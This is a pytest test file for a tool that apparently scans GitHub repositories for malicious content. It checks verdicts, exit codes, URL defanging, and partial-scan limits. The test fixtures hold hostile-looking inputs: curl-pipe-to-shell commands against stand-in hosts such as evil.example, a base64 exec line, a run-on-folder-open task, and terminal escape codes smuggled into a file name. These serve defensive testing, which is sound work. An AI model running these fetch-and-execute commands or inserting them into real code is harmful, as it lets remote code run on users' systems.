import base64
import json
import random
import subprocess
import sys

import httpx
import pytest

from gitray import cli
from tests.conftest import SHA, FakeGitHub, TarBuilder, make_tarball

TARGET = "github.com/octo/demo"


def run(fake: FakeGitHub, *args: str) -> int:
    return cli.main([*args, TARGET], transport=fake.transport())


def test_clean_repo_exits_0(fake_github: FakeGitHub, capsys: pytest.CaptureFixture[str]) -> None:
    assert run(fake_github) == 0
    out = capsys.readouterr().out
    assert "Verdict: CLEAN" in out
    assert "octo/demo" in out


def test_suspicious_repo_exits_1(fake_github: FakeGitHub) -> None:
    fake_github.tarball = make_tarball({".vscode/tasks.json": '{"runOn": "folderOpen"}'})
    assert run(fake_github) == 1


def test_dangerous_repo_exits_2(
    fake_github: FakeGitHub, capsys: pytest.CaptureFixture[str]
) -> None:
    fake_github.tarball = make_tarball(
        {
            "install.sh": "curl -s https://evil.example/x.sh | sh\n",
            "src/run.py": 'exec(base64.b64decode("cHJpbnQoMSk="))\n',
        }
    )
    assert run(fake_github) == 2
    out = capsys.readouterr().out
    assert "Verdict: DANGEROUS" in out
    assert "install.sh:1" in out
    # URLs from the scanned repo are never shown clickable.
    assert "https://evil.example" not in out
    assert "hxxps://evil[.]example" in out


def test_json_output_is_defanged(
    fake_github: FakeGitHub, capsys: pytest.CaptureFixture[str]
) -> None:
    fake_github.tarball = make_tarball({"README.md": "Get https://bit.ly/abc\n"})
    run(fake_github, "--json")
    data = json.loads(capsys.readouterr().out)
    assert data["verdict"] == "clean"
    assert data["findings"][0]["snippet"] == "Get hxxps://bit[.]ly/abc"
    assert data["complete"] is True


def test_terminal_escapes_in_repo_content_are_removed(
    fake_github: FakeGitHub, capsys: pytest.CaptureFixture[str]
) -> None:
    fake_github.tarball = make_tarball(
        {"x\x1b[2J.sh": "curl https://e.example/a | sh \x1b]0;pwn\x07\n"}
    )
    run(fake_github)
    out = capsys.readouterr().out
    assert "\x1b" not in out and "\x07" not in out


# --- partial scans: Incomplete replaces only Clean -----------------------------

BIG = 3 * 1024 * 1024


def test_partial_clean_scan_is_incomplete_exit_4(
    fake_github: FakeGitHub, capsys: pytest.CaptureFixture[str]
) -> None:
    fake_github.tarball = TarBuilder().file("a.txt", "hello\n").zeros("z.bin", BIG).build()
    assert run(fake_github, "--max-total-mb", "1") == 4
    out = capsys.readouterr().out
    assert "Verdict: INCOMPLETE" in out
    assert "PARTIAL SCAN: limit max_total_bytes (1048576) exceeded after 1 files" in out


def test_partial_suspicious_scan_keeps_verdict(
    fake_github: FakeGitHub, capsys: pytest.CaptureFixture[str]
) -> None:
    fake_github.tarball = TarBuilder().file("a.sh", "curl x | sh\n").zeros("z.bin", BIG).build()
    # The finding read before the limit still counts.
    assert run(fake_github, "--max-total-mb", "1") == 1
    out = capsys.readouterr().out
    assert "Verdict: SUSPICIOUS" in out
    assert "PARTIAL SCAN: limit max_total_bytes" in out


def test_partial_dangerous_scan_keeps_verdict(
    fake_github: FakeGitHub, capsys: pytest.CaptureFixture[str]
) -> None:
    fake_github.tarball = (
        TarBuilder()
        .file("a.sh", "curl x | sh\n")
        .file("b.py", 'exec(base64.b64decode("cHJpbnQoMSk="))\n')
        .zeros("z.bin", BIG)
        .build()
    )
    assert run(fake_github, "--max-total-mb", "1") == 2
    assert "PARTIAL SCAN" in capsys.readouterr().out


def test_partial_scan_json_names_limit_and_file_count(
    fake_github: FakeGitHub, capsys: pytest.CaptureFixture[str]
) -> None:
    fake_github.tarball = make_tarball({f"f{i}.txt": "x" for i in range(20)})
    assert run(fake_github, "--json", "--max-files", "5") == 4
    data = json.loads(capsys.readouterr().out)
    assert data["verdict"] == "incomplete"
    assert data["complete"] is False
    assert data["partial"]["limit"] == "max_files"
    assert data["partial"]["limit_value"] == 5
    # Entries counted against max_files include the root directory.
    assert data["partial"]["files_scanned"] == 4


@pytest.mark.parametrize("case", ["repo_size", "content_length"])
def test_early_limit_hits_are_incomplete_exit_4(
    fake_github: FakeGitHub, capsys: pytest.CaptureFixture[str], case: str
) -> None:
    if case == "repo_size":
        fake_github.repo["size"] = 10_000_000
        expected_limit = "max_repo_size_kb"
    else:
        fake_github.overrides[f"/octo/demo/legacy.tar.gz/{SHA}"] = lambda r: httpx.Response(
            200, headers={"Content-Length": str(10**12)}, content=iter([b""])
        )
        expected_limit = "max_download_bytes"
    assert run(fake_github, "--json") == 4
    data = json.loads(capsys.readouterr().out)
    assert data["verdict"] == "incomplete"
    assert data["repo"]["full_name"] == "octo/demo"
    assert data["partial"]["limit"] == expected_limit
    assert data["partial"]["files_scanned"] == 0


def test_complete_scan_has_no_partial_block(
    fake_github: FakeGitHub, capsys: pytest.CaptureFixture[str]
) -> None:
    run(fake_github, "--json")
    data = json.loads(capsys.readouterr().out)
    assert data["complete"] is True and data["partial"] is None


def test_score_breakdown_names_each_rule(
    fake_github: FakeGitHub, capsys: pytest.CaptureFixture[str]
) -> None:
    blob = base64.b64encode(random.Random(0).randbytes(240)).decode()
    fake_github.tarball = make_tarball(
        {"ci.yml": "run: curl -o- https://e.example/i.sh | bash\n", "t/data": f"x={blob}\n"}
    )
    assert run(fake_github) == 1
    out = capsys.readouterr().out
    assert "Score: 50/100" in out
    assert "Score breakdown: GR-CODE-002 +35, GR-OBF-001 +15" in out


# --- exit code 3 for every kind of error --------------------------------------


def test_no_arguments_exits_3(capsys: pytest.CaptureFixture[str]) -> None:
    assert cli.main([]) == 3
    assert "usage:" in capsys.readouterr().err


def test_unknown_flag_exits_3(capsys: pytest.CaptureFixture[str]) -> None:
    assert cli.main(["--no-such-flag", TARGET]) == 3


def test_bad_flag_value_exits_3() -> None:
    assert cli.main(["--max-files", "lots", TARGET]) == 3


def test_invalid_target_exits_3(capsys: pytest.CaptureFixture[str]) -> None:
    assert cli.main(["gitlab.com/x/y"]) == 3
    assert "not a GitHub repository" in capsys.readouterr().err


def test_github_error_exits_3(fake_github: FakeGitHub) -> None:
    assert cli.main(["github.com/octo/missing"], transport=fake_github.transport()) == 3


def test_unexpected_exception_exits_3(
    fake_github: FakeGitHub, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    def boom(*a: object, **k: object) -> None:
        raise RuntimeError("boom")

    monkeypatch.setattr(cli, "scan_repo", boom)
    assert run(fake_github) == 3
    err = capsys.readouterr().err
    assert "unexpected error: RuntimeError" in err
    assert "Traceback" not in err


def test_unexpected_exception_traceback_with_debug(
    fake_github: FakeGitHub, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    def boom(*a: object, **k: object) -> None:
        raise RuntimeError("boom")

    monkeypatch.setattr(cli, "scan_repo", boom)
    assert run(fake_github, "--debug") == 3
    assert "Traceback" in capsys.readouterr().err


def test_keyboard_interrupt_exits_3(
    fake_github: FakeGitHub, monkeypatch: pytest.MonkeyPatch
) -> None:
    def interrupt(*a: object, **k: object) -> None:
        raise KeyboardInterrupt

    monkeypatch.setattr(cli, "scan_repo", interrupt)
    assert run(fake_github) == 3


def test_help_exits_0(capsys: pytest.CaptureFixture[str]) -> None:
    assert cli.main(["--help"]) == 0
    assert "Exit codes" in capsys.readouterr().out


def test_python_dash_m_uses_exit_code_3_for_argparse_errors() -> None:
    # Runs our own CLI (not scanned code) to check the real process exit code.
    proc = subprocess.run(
        [sys.executable, "-m", "gitray", "--no-such-flag"],
        capture_output=True,
        check=False,
    )
    assert proc.returncode == 3
